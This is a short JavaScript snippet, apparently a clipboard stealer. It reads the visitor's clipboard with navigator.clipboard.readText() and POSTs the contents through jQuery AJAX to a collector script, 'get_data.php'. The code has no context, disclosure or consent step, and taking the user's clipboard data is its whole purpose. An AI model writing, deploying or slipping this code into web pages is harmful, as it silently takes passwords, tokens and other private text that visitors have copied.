function post(dataclip){
$.ajax({
    type: 'POST',
    data: { cat: dataclip },
    url: 'get_data.php',
    dataType: 'json',
    async: false
  });
};

navigator.clipboard.readText().then(text => post(text));
